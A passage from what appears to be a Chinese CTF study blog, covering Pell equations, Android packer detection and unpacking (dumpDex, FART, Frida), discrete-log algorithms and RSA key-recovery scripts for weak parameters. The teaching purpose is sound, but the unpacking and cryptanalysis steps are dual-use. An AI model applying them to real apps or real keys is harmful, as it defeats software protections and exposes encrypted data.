ans = [[0 for i in range(2)]for j in range(2)] for i in range(2): for j in range(2): for k in range(2): ans[i][j] += x[i][k] * y[k][j] return ansdef quickMatrix(m,n): E = [[0 for i in range(2)]for j in range(2)] #先定义一个单位矩阵 for i in range(2): E[i][i] = 1 while(n): if n % 2 != 0: E = mulMatrix(E,m) m = mulMatrix(m,m) n &gt;&gt;= 1 return Eprint(quickMatrix(m,n)) ​ 佩尔方程 / Pell方程若一个不定方程具有形式： $x^2-ny^2=1$ 则称此二元二次不定方程为佩尔方程。 若 $n$ 是完全平方数，则这个方程式只有平凡解。对于其余情况，拉格朗日证明了佩尔方程总有非平凡解。而这些解可由 $\\sqrt{n}$ 的连分数求出。 设 $\\frac{p}{q}$ 是 $\\sqrt{n}$ 的连分数表示：$[a_0;a_1,a_2,a_3,\\cdots]$ 的渐进分数列，由连分数理论知存在 $i$ 使得 $(p_i,q_i)$ 为佩尔方程的解。取其中最小的 $i$，将对应的 $(p_i,q_i)$ 称为佩尔方程的基本解（最小解），记作 $(x_1,y_1)$，则所有的解 $(x_i,y_i)$ 可表示成如下形式： $x_i+y_i\\sqrt{n}=(x_1+y_1\\sqrt{n})^i$ 或者由以下的递推式得到： $x_{i+1} = x_1x_i+ny_1y_i$ $y_{i+1} = x_1y_i+y_1x_i$ 1234567891011def solve_pell(N, numTry = 100): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer^2 - N * denom^2 == 1: return numer, denom return None, NoneN = solve_pell(N)","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"}],"author":"Lazzaro"},{"title":"Android逆向","slug":"reverse-Android逆向","date":"2020-05-10T09:52:00.000Z","updated":"2022-09-01T15:48:46.861Z","comments":true,"path":"2020/05/10/reverse-Android逆向/","link":"","permalink":"https://lazzzaro.github.io/2020/05/10/reverse-Android%E9%80%86%E5%90%91/","excerpt":"","text":"apk壳检测12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import zipfile&#x27;&#x27;&#x27;first,get namelist from apksecond,matching the featuresthrid,julging for the shellTypeso easy~~by zsdlove2018/8/24 Morning&#x27;&#x27;&#x27;shellfeatures=&#123; &quot;libchaosvmp.so&quot;:&quot;娜迦&quot;, &quot;libddog.so&quot;:&quot;娜迦&quot;, &quot;libfdog.so&quot;:&quot;娜迦&quot;, &quot;libedog.so&quot;:&quot;娜迦企业版&quot;, &quot;libexec.so&quot;:&quot;爱加密&quot;, &quot;libexecmain.so&quot;:&quot;爱加密&quot;, &quot;ijiami.dat&quot;:&quot;爱加密&quot;, &quot;ijiami.ajm&quot;:&quot;爱加密企业版&quot;, &quot;libsecexe.so&quot;:&quot;梆梆免费版&quot;, &quot;libsecmain.so&quot;:&quot;梆梆免费版&quot;, &quot;libSecShell.so&quot;:&quot;梆梆免费版&quot;, &quot;libDexHelper.so&quot;:&quot;梆梆企业版&quot;, &quot;libDexHelper-x86.so&quot;:&quot;梆梆企业版&quot;, &quot;libprotectClass.so&quot;:&quot;360&quot;, &quot;libjiagu.so&quot;:&quot;360&quot;, &quot;libjiagu_art.so&quot;:&quot;360&quot;, &quot;libjiagu_x86.so&quot;:&quot;360&quot;, &quot;libegis.so&quot;:&quot;通付盾&quot;, &quot;libNSaferOnly.so&quot;:&quot;通付盾&quot;, &quot;libnqshield.so&quot;:&quot;网秦&quot;, &quot;libbaiduprotect.so&quot;:&quot;百度&quot;, &quot;aliprotect.dat&quot;:&quot;阿里聚安全&quot;, &quot;libsgmain.so&quot;:&quot;阿里聚安全&quot;, &quot;libsgsecuritybody.so&quot;:&quot;阿里聚安全&quot;, &quot;libmobisec.so&quot;:&quot;阿里聚安全&quot;, &quot;libtup.so&quot;:&quot;腾讯&quot;, &quot;libexec.so&quot;:&quot;腾讯&quot;, &quot;libshell.so&quot;:&quot;腾讯&quot;, &quot;mix.dex&quot;:&quot;腾讯&quot;, &quot;lib/armeabi/mix.dex&quot;:&quot;腾讯&quot;, &quot;lib/armeabi/mixz.dex&quot;:&quot;腾讯&quot;, &quot;libtosprotection.armeabi.so&quot;:&quot;腾讯御安全&quot;, &quot;libtosprotection.armeabi-v7a.so&quot;:&quot;腾讯御安全&quot;, &quot;libtosprotection.x86.so&quot;:&quot;腾讯御安全&quot;, &quot;libnesec.so&quot;:&quot;网易易盾&quot;, &quot;libAPKProtect.so&quot;:&quot;APKProtect&quot;, &quot;libkwscmm.so&quot;:&quot;几维安全&quot;, &quot;libkwscr.so&quot;:&quot;几维安全&quot;, &quot;libkwslinker.so&quot;:&quot;几维安全&quot;, &quot;libx3g.so&quot;:&quot;顶像科技&quot;, &quot;libapssec.so&quot;:&quot;盛大&quot;, &quot;librsprotect.so&quot;:&quot;瑞星&quot;&#125;def shellDetector(apkpath): shellType=&quot;&quot; shellsign=&quot;&quot; flag=True zipfiles=zipfile.ZipFile(apkpath) nameList=zipfiles.namelist() for fileName in nameList: for shell in shellfeatures.keys(): if shell in fileName: flag=True shellType=shellfeatures[shell] shellsign=shell break else: flag=False if flag==True: print(&quot;经检测，该apk使用了&quot;+shellType+&quot;进行加固&quot;)if __name__ == &#x27;__main__&#x27;: shellDetector(&quot;test.apk&quot;) ​ 脱壳方法 dumpDexdumpDex-Android脱壳：https://github.com/WrBug/dumpDex dumpDex是一个github上开源的xposed插件，可以用来脱掉当前市场上大部分的壳。 一、准备工作 首先需要root的手机一部，我使用的是华为荣耀6（android5.1），安装好xposed框架 dumpDex项目地址：https://github.com/WrBug/dumpDex 可以直接下载release的apk，也可以自行编译打包成apk安装到手机，我个人比较喜欢第二种。 安装好apk后，对于32位手机，需要将lib/armeabi-v7a/libnativeDump.so复制到/data/local/tmp/libnativeDump.so，权限设置为777。 二、开始脱壳 反编译apk后，根据特征发现是使用了梆梆加固 安装插件，重启手机，打开加固的apk，脱壳的后的dex会在/data/data/对应包路径/dump文件夹下 脱壳后的dex如图所示，其中有一部分是壳的dex，需要自己自行选择一下 三、补充说明 设置权限问题，GitHub上有详细说明 编译过程有可能会有让你设置签名的一个问题，直接设置成你的debug签名就可 如果加固后的包名在PackageInfo.java中没有对应的，自行加到PackageInfo.java中即可 应用有可能有卡死状况或者手机重启状况，但应该能脱出壳来，建议多脱几遍 源码部分如果是百度系的壳，直接返回并有没dump，因为还没遇到过百度的壳，暂不知道具体原因 FART1、安装镜像 从https://github.com/hanbinglengyue/FART上下载镜像，然后按照https://www.bodkin.ren/index.php/archives/513/刷机，中间没有遇到什么问题。 123456789adb reboot bootloaderfastboot oem unlockfastboot flash system system.imgfastboot flash userdata userdata.imgfastboot flash boot boot.imgfastboot flash cache cache.imgfastboot flash ramdisk ramdisk.imgfastboot reboot 2、修改fart文件并上传 将fart配置文件fart复制到/data/fart（注意文件权限问题，和换行的问题），其中，fart配置文件中为要脱壳的app包名 1adb push ~/app_crack/fart/test/fart /data 3、查看日志确认 12# 在命令行输入下面的命令，然后打开appadb logcat -s ActivityThread 4、查看脱出来的dex 1adb pull /sdcard/fart/包名/6600696_dexfile.dex . Fridahttps://github.com/hluwa/FRIDA-DEXDump https://github.com/GuoQiang1993/Frida-Apk-Unpack 使用： 默念一声”我想脱个壳”。 启动 APP。 启动 frida-server。 python main.py。 默数三秒，脱好了。 或者可以将脚本封装成命令，就像这样： 其他方法https://github.com/CodingGay/BlackDex https://www.freebuf.com/column/210015.html","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://lazzzaro.github.io/tags/Android/"}],"author":"Lazzaro"},{"title":"离散对数","slug":"crypto-离散对数","date":"2020-05-07T12:03:21.000Z","updated":"2022-11-27T17:07:58.301Z","comments":true,"path":"2020/05/07/crypto-离散对数/","link":"","permalink":"https://lazzzaro.github.io/2020/05/07/crypto-%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/","excerpt":"","text":"​ 在整数中，离散对数（Discrete Logarithm, DL）是一种基于同余运算和原根的一种对数运算。 在任何群 $G$ 中可为所有整数 $k$ 定义一个幂数为 $b^k$，而离散对数 $\\log_ba$ 是指使得 $b^k = a$ 的整数 $k$。 离散对数在一些特殊情况下可以快速计算。然而，通常没有具非常效率的方法来计算它们。公钥密码学中几个重要算法的基础，是假设寻找离散对数的问题解，在仔细选择过的群中，并不存在有效率的求解算法。 ​ 基本定义生成元 在一个群 $G$ 中，如果 $g$ 是 $G$ 的生成元，即所有 $G$ 中的所有元素都可以被表示成 $y=g^x$，此时的 $x$ 称为 $y$ 在 $G$ 中的对数。 阶 设 $m \\ge 1,\\gcd(a,m)=1$，使得 $a^d \\equiv 1 \\pmod m$ 成立的最小正整数 $d$ 称为 $a$ 对模 $m$ 的指数或者阶。一般将其计为 $\\delta_m(a)$。 满足 $a^d \\equiv 1 \\pmod m$ 的 $d$ 一定满足 $d \\mid \\varphi(m)$。 原根 当 $\\delta_m(a)=\\varphi(m)$ 时，称 $a$ 是模 $m$ 的原根，简称 $m$ 的原根。 只有 $m=2,4,p^\\alpha,2p^\\alpha$（$p$ 为奇素数，$\\alpha$ 为正整数）时，模 $m$ 的剩余系存在原根。（充要条件） ​ 常规Sage函数参数说明：求解以base为底，a的对数；ord为base的阶，可以缺省，operation可以是+与*，默认为*；bounds是一个区间(ld,ud)，需要保证所计算的对数在此区间内。 discrete_log(a,base,ord,operation) 通用的求离散对数的方法。 discrete_log_rho(a,base,ord,operation) 求离散对数的Pollard-Rho算法。 discrete_log_lambda(a,base,bounds,operation) 求离散对数的Pollard-kangaroo算法（也称为lambda算法）。 bsgs(base,a,bounds,operation) 小步大步法。 12345678910111213141516#生成64位的素数p作为模数，int为32位，超过int要在数字后加Lp=random_prime(2L**64) #定义有限域GF(p)G=GF(p) #找一个模p的原根gp (&#x27;znprimroot(&#x27;+str(p)+&#x27;)&#x27;)#输出Mod(rt,p)，则x是模p的原根g=G(rt) #生成私钥x=G(ZZ.random_element(p-1)) #公钥y=g^x mod p，由于已经定义在GF(p)上，因此g**x就是g^x mod py=g**x 1234567891011121314151617181920212223#计算DLP的通用方法discrete_log(y,g)==x#n为合数（Pohlig-Hellman）x = discrete_log(mod(b,n),mod(a,n)) #n为质数或质数幂（线性筛Index Calculus）R = Integers(99)a = R(4)b = a^9b.log(a)#或x = int(pari(f&quot;znlog(&#123;int(b)&#125;,Mod(&#123;int(a)&#125;,&#123;int(n)&#125;))&quot;))x = gp.znlog(b, gp.Mod(a, n)) #计算离散对数的lambda方法discrete_log_lambda(y,g,(floor(ZZ(x)/2),2*ZZ(x)))==x #小步大步法计算DLPbsgs(g,y,(floor(ZZ(x)/2),2*ZZ(x)))==x#GF(p)下计算DLPF = GF(p)ax = F(b + (a - 1) * A) / F(a * s - s + b)x = discrete_log(F(ax), F(a)) ​ 大步小步算法（BSGS）大步小步算法常用于求解用于解决解高次同余方程的问题，问题形式如：有同余方程$a^x \\equiv b \\pmod p$，$p$ 为质数，求最小非负整数解 $x$ 使得原方程成立。这类问题也称为离散对数问题。该算法的复杂度可以达到$O(\\sqrt{p}\\log{n})$甚至更低。 12#Sagebsgs(base,a,bounds,operation) 1234567891011121314151617181920212223def babystep_giantstep(g, y, p): m = int((p-1)**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step gm = pow(g, -m, p) # gm = g^&#123;-m&#125; ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: # 右辺と左辺が一致するとき return q * m + table[ygqm] ygqm = (ygqm * gm) % p return Noneg = y = p = x = babystep_giantstep(g, y, p)print(x)print(pow(g, x, p) == y) ​ Pollard Rho算法Pollard Rho算法是一种随机性的概率型算法，基于PR算法我们可以加速大整数的因子分解，这也是1975年Pollard提出该算法时的应用方面，这可以用来攻击RSA的公钥密码体制，之后在1978年Pollard又利用循环群 $ρ$ 形的特点提出了用于解决离散对数问题的PR算法，后来也扩展到了椭圆曲线上，这样PR算法便成功威胁到了整个公钥密码体系。 解决离散对数问题的Pollard Rho算法，可以帮助我们在有限的循环群上解决离散对数问题。简单来看我们取一个大素数 $P$，设 $G$ 为一个乘法的循环群，其生成元为 $g$，则该群的阶就是 $N=P-1$。此时在 $G$ 上的离散对数问题就是对于 $G$ 中的元素 $q$，找到 $x$ 使得 $g^x=q$，而Pollard Rho算法主要就是利用了循环群的生成序列呈现一个 $ρ$ 字形状。 使用Pollard Rho算法后可以将求解的时间复杂度降到 $O(\\sqrt{N})$，至于空间复杂度则可以忽略不计，因为该算法是个概率型算法，每次只随机选取一对进行比较，所以不会占用存储，这与大步小步算法相反，其实PR算法也可以看作是大步小步算法的随机化版本，继承令时间复杂度的有点，同时还减少了空间的消耗，因为大步小步算法需要占用大量的存储空间。 此算法适用于生成元的阶的素因子都是大数的情形。 参考：https://xz.aliyun.com/t/2780 12#Sagediscrete_log_rho(a,base,ord,operation) 12345678910111213141516171819202122232425262728293031def pollard_rho(g, y, p): q = (p-1) // 2 def new_xab(x, a, b, g, y, p, q): subset = x % 3 if subset == 0: return ((x*x) % p, (a*2) % q, (b*2) % q) if subset == 1: return ((x*g) % p, (a+1) % q, b ) if subset == 2: return ((x*y) % p, a , (b+1) % q) x, a, b = 1, 0, 0 X, A, B = x, a, b for i in range(1, p): x, a, b = new_xab(x, a, b, g, y, p, q) X, A, B = new_xab(X, A, B, g, y, p, q) X, A, B = new_xab(X, A, B, g, y, p, q) if x == X: break res = ((a - A) * pow(B - b, -1, q)) % q if pow(g, res, p) == y: return res if pow(g, res + q, p) == y: return res + q return Noneg = y = p = x = pollard_rho(g, y, p)print(x)print(pow(g, x, p) == y) ​ Pohlig-Hellman算法Pohig-Hellman算法是一种求解光滑阶循环群上的离散对数的方法。 Pohlig-Hellman算法的复杂度在一般情况下比BSGS算法高，但是在特殊情况下（循环群的阶是光滑数，即可以因子分解成较小的数的乘积），使用Pohlig-Hellman能取得好的效果。而且有些时候，尽管BSGS能够将复杂度降至$\\sqrt{p}$，但是这个数依然很大，所以不能用。这时可以考虑Pohlig-hellman方法能不能起作用。 算法思想 考虑DLP问题：$a^x \\equiv b \\pmod p$，因为 $p$ 是大素数，模 $p$ 的循环群的阶是 $p−1$。假设模 $p$ 的最小的本原元是 $g$（本原元是可以求的），那么有 $\\left\\{\\begin{array}{c} a \\equiv g^{a’} \\pmod p \\\\ b \\equiv g^{b’} \\pmod p \\end{array}\\right.$ 进一步有 $a^x \\equiv b \\pmod p \\Longleftrightarrow g^{a’x} \\equiv g^{b’} \\pmod p$， 有 $a’x \\equiv b’ \\pmod {p-1}$， 如果求出了满足上式的 $a’$ 和 $b’$ ，通过扩展gcd方法可以求一次同余方程的解得到 $x$ 。 问题归结成如何求 $a’$ 和 $b’$ ，即原本的一个离散对数问题，现在变成两个离散对数问题： $\\left\\{\\begin{array}{c} a \\equiv g^{a’} \\pmod p \\\\ b \\equiv g^{b’} \\pmod p \\end{array}\\right.$ 以求 $a’$ 为例，解DLP问题：$g^x \\equiv a \\pmod p$： 将 $p-1$ 进行标准的素因子分解，即 $p-1=\\prod\\limits_{i=1}^{m} p_i^{k_i}=p_1^{k_1}p_2^{k_2}p_3^{k_3} \\cdots p_m^{k_m}$； 对每个素因子 $p_i$，将 $x$ 表示成 $p_i$ 进制，有 $x=a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1} \\pmod {p_i^{k_i}}$， 这样的 $p_i$ 进制表示，系数 $a_i$ 自然是小于 $p_i$； 令 $r=1$，有 $(g^x)^{\\frac{p-1}{p_i^r}} \\equiv a^{\\frac{p-1}{p_i^r}} \\pmod p$，展开 $x$ 有 $(g^{a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1}})^{\\frac{p-1}{p_i^r}} \\equiv a^{\\frac{p-1}{p_i^r}} \\pmod p$ $g^{a_0{\\frac{p-1}{p_i}}} \\cdot g^{a_1(p-1)} \\cdot g^{a_2(p-1)p_i} \\cdots g^{a_{k_i-1}(p-1)p_i^{k_i-2}} \\equiv a^{\\frac{p-1}{p_i}} \\pmod p$ 注意从第二项开始，每一项指数都包含 $p−1$（由费马小定理知 $g^{p-1} \\equiv 1 \\pmod p$），所以式子变成 $g^{a_0{\\frac{p-1}{p_i}}} \\equiv a^{\\frac{p-1}{p_i}} \\pmod p$ 这个式子中只有 $a_0$ 是未知的，因为 $a_0 \\in [0,p_i−1]$，所以可以穷举得到 $a_0$ 的值。 再令 $r=2,3,4,\\cdots,k_i$，重复步骤3，依次穷举求出 $a_1,a_2,\\cdots,a_{k_i-1}$，整个的时间复杂度是 $\\mathrm{O}(p_ik_i)$。可以得到 $x=a_0+a_1p_1+a_2p_2^2+a_3p_3^3+\\dots+a_{k_i-1}p_i^{k_i-1} \\pmod {p_i^{k_i}}$ 重复上述过程，得到 $m$ 个关于 $x$ 的式子，利用中国剩余定理（CRT），可以计算出 $x$ 的值。 利用这个方法求出 $a’$ 和 $b’$ 后，就可以得到原DLP问题的解。 注： Pohlig-Hellman算法最重要的点是利用了原根的性质，它只能解决 $a \\equiv g^x \\pmod p$（$g$ 是原根）的问题，对于 $g$ 不是原根的情况，需要利用原根将原方程转化成两个关于原根的离散对数问题。 注意Pohlig-hellman只能用于求解光滑阶群，也就是 $p-1$ 可以分解成小的素因子乘积。否则，穷举 $a_i$ 的时间复杂度依旧很高。另外可以考虑在穷举 $a_i$ 时利用小步大步算法，进一步优划算法复杂度。 123456789101112131415161718192021222324252627282930313233343536373839404142# Baby-step Giant-step法def babystep_giantstep(g, y, p, q=None): if q is None: q = p - 1 m = int(q**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step try: gm = pow(g, -m, p) # gm = g^&#123;-m&#125; except: return None ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: return q * m + table[ygqm] ygqm = (ygqm * gm) % p return None# Pohlig–Hellman法def pohlig_hellman_DLP(g, y, p): crt_moduli = [] crt_remain = [] for q, _ in factor(p-1): x = babystep_giantstep(pow(g,(p-1)//q,p), pow(y,(p-1)//q,p), p, q) if (x is None) or (x &lt;= 1): continue crt_moduli.append(q) crt_remain.append(x) x = crt(crt_remain, crt_moduli) return xg = y = p = x = pohlig_hellman_DLP(g, y, p)print(x)print(pow(g, x, p) == y) ​ 指数计算法 / Index Calculus Algorithm1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465def is_Bsmooth(b, n): factors = list(factor(int(n))) if len(factors) != 0 and factors[-1][0] &lt;= b: return True, dict(factors) else: return False, dict(factors)def find_congruences(B, g, p, congruences=[]): unique = lambda l: list(set(l)) bases = [] max_equations = prime_pi(B) while True: k = randint(2, p-1) ok, factors = is_Bsmooth(B, pow(g,k,p)) if ok: congruences.append((factors, k)) if len(congruences) &gt;= max_equations: break bases = unique([base for c in [c[0].keys() for c in congruences] for base in c]) return bases, congruencesdef to_matrices(R, bases, congruences): M = [[c[0][base] if base in c[0] else 0 \\ for base in bases] for c in congruences] b = [c[1] for c in congruences] return Matrix(R, M), vector(R, b)def index_calculus(g, y, p, B=None): R = IntegerModRing(p-1) if B is None: B = ceil(exp(0.5*sqrt(2*log(p)*log(log(p))))) bases = [] congruences = [] for i in range(100): bases, congruences = find_congruences(B, g, p, congruences) M, b = to_matrices(R, bases, congruences) try: exponents = M.solve_right(b) break except ValueError: # matrix equation has no solutions continue else: return None # ag^y mod p while True: k = randint(2, p-1) ok, factors = is_Bsmooth(B, (y * pow(g,k,p)) % p) if ok and set(factors.keys()).issubset(bases): print(&#x27;found k = &#123;&#125;&#x27;.format(k)) break print(&#x27;bases:&#x27;, bases) print(&#x27;q:&#x27;, factors.keys()) dlogs = &#123;b: exp for (b,exp) in zip(bases, exponents)&#125; x = (sum(dlogs[q] * e for q, e in factors.items()) - k) % (p-1) if pow(g, x, p) == y: return x return Noneg = y = p = x = index_calculus(g, y, p)print(x)print(pow(g, x, p) == y) ​ 多项式DLP参考：InCTF 2020 - DLPoly 1234567891011121314151617181920212223242526272829303132333435363738394041424344#Sagedef brute_dlp(gi, ci, n, lim): bi = gi for i in range(1, lim+1): if bi == ci: return i bi = (bi * gi) % n print(&quot;[-] NOT in the range&quot;) print(&quot;[-] Something&#x27;s Wrong, you gotta check the range&quot;, lim)def pohlig_hellman(g, c, s, n, factors): res = [] modulus = [] for q, e in factors: assert pow(g, s//(q**e), n) != 1 gi = pow(g, s//(q**e), n) ci = pow(c, s//(q**e), n) dlogi = brute_dlp(gi, ci, n, q**e) print(&quot;[+] dlog modulo &#123;0&#125; == &#123;1&#125;&quot;.format(q**e, dlogi)) res.append(dlogi) modulus.append(q**e) print(&quot;\\n[*] res = &quot;, res) print(&quot;[*] modulus = &quot;, modulus) dlog = CRT(res, modulus) print(&quot;\\n[+] dlog modulo &#123;0&#125; == &#123;1&#125;&quot;.format(prod(modulus), dlog)) return dlogp = P = PolynomialRing(Zmod(p), name=&#x27;x&#x27;)x = P.gen()n = g = nfactors = n.factor()s = 1for i in nfactors: s *= p**(i[0].degree()) - 1print(s)print(factor(s))qe = dlog = pohlig_hellman(g, c, s, n, qe)flag = bytes.fromhex(hex(dlog)[2:])print(&quot;\\n[*] flag = &quot;, flag.decode()) ​ 矩阵DLP给定 $n$ 阶矩阵 $G$，求满足 $G^x=H$ 的 $x$ 值。 通常矩阵的乘法是复杂的，而矩阵的幂就更是这样了。注意到 $A^n=P(P^{-1}AP^n)P^{-1}$， 如果能找到合适的矩阵 $P$ 使得 $P^{−1}AP$ 的幂是简单的，就找到了计算矩阵的幂乃至多项式的简便方法。例如计算对角矩阵的幂只需对分量求幂，这就非常简单。 但是并非所有的 $n$ 阶矩阵都可以对角化，经过复杂的论证，得知 $n$ 阶矩阵一定有 Jordan 标准型，也就是对于 $n$ 阶矩阵 $A$，构造可逆矩阵 $P$ 使得 $P^{-1}AP=\\text{diag}\\{J_1,J_2,\\cdots,J_s\\}$，其中 $J_1,J_2,\\cdots,J_s$ 是 Jordan 块。所谓特征值为 $\\lambda$ 的 $n$ 阶 Jordan 块，就是 $n$ 阶矩阵 $J_n(\\lambda)=\\left(\\begin{matrix} \\lambda &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 \\newline 0 &amp; \\lambda &amp; 1 &amp; \\cdots &amp; 0 &amp; 0 \\newline 0 &amp; 0 &amp; \\lambda &amp; \\cdots &amp; 0 &amp; 0 \\newline \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; 1 \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; \\lambda \\newline \\end{matrix}\\right)$ 特别地，对于矩阵 $A$ 可对角化的情形，相应的 Jordan 块 $J_1,J_2,\\cdots,J_s$ 均为一阶的。 计算 $(J_n(\\lambda))^k$. 注意到 $J_n(\\lambda)=\\lambda E+J_n(0)$, 应用二项式定理，得到 $(J_n(\\lambda))^k=\\left(\\begin{matrix} \\lambda^k &amp; k\\lambda^{k-1} &amp; \\cdots &amp; \\mathrm{C}_k^{n-1}\\lambda^{k-n+1} \\newline 0 &amp; \\lambda^k &amp; \\cdots &amp; \\mathrm{C}_k^{n-2}\\lambda^{k-n+2} \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; \\lambda^k \\newline \\end{matrix}\\right)$ 参考：Sharif CTF 8 - ElGamat 12345678910n = p = A = []B = []G = matrix(GF(p), n, n, A)H = matrix(GF(p), n, n, B)G_Jor, P = G.jordan_form(transformation=True)H_Jor = ~P * H * P","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"离散对数","slug":"离散对数","permalink":"https://lazzzaro.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"}],"author":"Lazzaro"},{"title":"RSA","slug":"crypto-RSA","date":"2020-05-06T14:15:00.000Z","updated":"2022-12-08T06:09:00.082Z","comments":true,"path":"2020/05/06/crypto-RSA/","link":"","permalink":"https://lazzzaro.github.io/2020/05/06/crypto-RSA/","excerpt":"","text":"常用工具 分解大素数 factordb （http://www.factordb.com） yafu（$p,q$相差过大或过小yafu可分解成功） sage （divisors(n)）（小素数） Pollard’s p−1 （python -m primefac -vs -m=p-1 xxxxxxx）（光滑数） Williams’s p+1（python -m primefac -vs -m=p+1 xxxxxxx）（光滑数） cado-nfs 在线sage环境：https://sagecell.sagemath.org/ Openssl 解析加密密钥： openssl rsa -pubin -text -modulus -in pub.key 生成解密密钥： python rsatool.py -f PEM -o key.key -p 1 -q 1 -e 1 openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag openssl rsautl -decrypt -oaep -inkey key.pem -in flag.enc -out flag （OAEP方式） 脚本生成解密密钥： 12345678910111213141516# coding=utf-8import mathimport sysfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEP rsa_components = (n1, e, int(d1), p, q1)myrsa = RSA.construct(rsa_components)private = open(&#x27;private.pem&#x27;, &#x27;w&#x27;)private.write(myrsa.exportKey())private.close()rsakey = RSA.importKey(myrsa.exportKey()) rsakey = PKCS1_OAEP.new(rsakey)decrypted = rsakey.decrypt(c_bytes) 脚本集 https://github.com/Ganapati/RsaCtfTool 1234567891011#用法一：已知公钥(自动求私钥) $ python3 RsaCtfTool.py --publickey 公钥文件 --uncipherfile 加密文件 #用法二：已知公钥求私钥 $ python3 RsaCtfTool.py --publickey 公钥文件 --private #用法三：密钥格式转换 #把PEM格式的公钥转换为n，e $ python3 RsaCtfTool.py --dumpkey --key 公钥文件 #把n,e转换为PEM格式 $ python3 RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537 https://github.com/yifeng-lee/RSA-In-CTF https://github.com/ValarDragon/CTF-Crypto ​ 常见类型给p,q,e,c123456789101112import gmpy2 as gpimport binasciip = q = e = c = n = p*qphi = (p-1)*(q-1)d = gp.invert(e,phi)m = pow(c,d,n)print(m)print(bytes.fromhex(hex(m)[2:])) ​ 给n,e,dp,c$dp\\equiv d \\pmod {(p-1)}$ $\\because dp\\cdot e\\equiv d\\cdot e\\equiv 1 \\pmod {(p-1)}$ $\\therefore dp\\cdot e-1=k\\cdot (p-1)$ $\\therefore (dp\\cdot e-1)\\cdot d\\cdot e=k’\\cdot (p-1),\\quad k’=k\\cdot d\\cdot e \\\\\\Leftrightarrow d\\cdot e=-k’\\cdot (p-1)+dp\\cdot e\\cdot d\\cdot e\\equiv 1 \\pmod{\\varphi(n)}\\\\\\Leftrightarrow -k’\\cdot (p-1)+dp\\cdot e\\equiv 1\\pmod{\\varphi(n)}$ $\\therefore k_{1}\\cdot (p-1)+dp\\cdot e-1=k_{2}\\cdot (p-1)\\cdot (q-1)\\\\\\Leftrightarrow (p-1)\\cdot (k_{2}\\cdot (q-1)-k_{1})+1=dp\\cdot e$ $\\because dp&lt;p-1\\quad \\therefore (k_{2}\\cdot (q-1)-k_{1})\\in (0, e)$ $\\therefore$ 遍历 $(1, e)$，当同时满足 $(dp\\cdot e-1)\\bmod i==0$ 和 $n\\bmod((dp\\cdot e-1)//i+1)==0$ 时，$N$ 成功分解。 12345678910111213141516171819202122import gmpy2 as gpe = n = dp = c = for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 if(n%p!=0): continue q=n//p phin=(p-1)*(q-1) d=gp.invert(e, phin) m=gp.powmod(c, d, n) if(len(hex(m)[2:])%2==1): continue print(&#x27;--------------&#x27;) print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) 变种1：给 $p,e,d_p,c,b$，其中 $n=p^bq$。 Hensel lifting for Takagi’s scheme（p.189）： 1234567891011121314from Crypto.Util.number import *import gmpy2p = dp = c = b = e = mp1 = pow(c, dp, p)mp = pow(c, dp - 1, p)for i in range(1, b - 2): x = pow(c - pow(mp1, e), 1, p**(i + 1)) y = pow(x * mp * (gmpy2.invert(e, p)), 1, p**(i + 1)) mp1 = mp1 + yprint(long_to_bytes(mp1)) 变种2：给 $n,e,dp_0,c,k$，其中 $dp_0$ 为 $dp$ 高 $(n\\text{bits}-k)$ 位，即 $dp_0=dp&gt;&gt;k$。 （Coppersmith攻击，已知dp高位攻击） $e\\cdot dp \\equiv e\\cdot d\\equiv 1 \\pmod {(p-1)} \\\\\\Leftrightarrow e \\cdot dp=k(p-1)+1=kp-k+1 \\\\\\Leftrightarrow e\\cdot dp+k-1 \\equiv 0 \\pmod p$ $\\because dp&lt;p-1$，$\\therefore k&lt;e$ $\\therefore e\\cdot (dp_0&lt;&lt;k+x)+k-1 \\equiv 0 \\pmod p$ 1234567891011121314151617181920212223#Sagedp0 = e = n = F.&lt;x&gt; = PolynomialRing(Zmod(n))d = inverse_mod(e, n)for k in range(1, e): f = (secret &lt;&lt; 200) + x + (k - 1) * d x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret &lt;&lt; 200) for i in range(2, e): p = (e * Integer(dp) - 1 + i) // i if n % p == 0: break if p &lt; 0: continue else: print(&#x27;k = &#x27;,k) print(&#x27;p = &#x27;,p) print(&#x27;dp = &#x27;,dp) break 变种3：给 $n,e,dp,c$​​，其中 $dp$​​​ 很小，$e$ 很大。 枚举 $dp$，因 $e\\cdot dp \\equiv 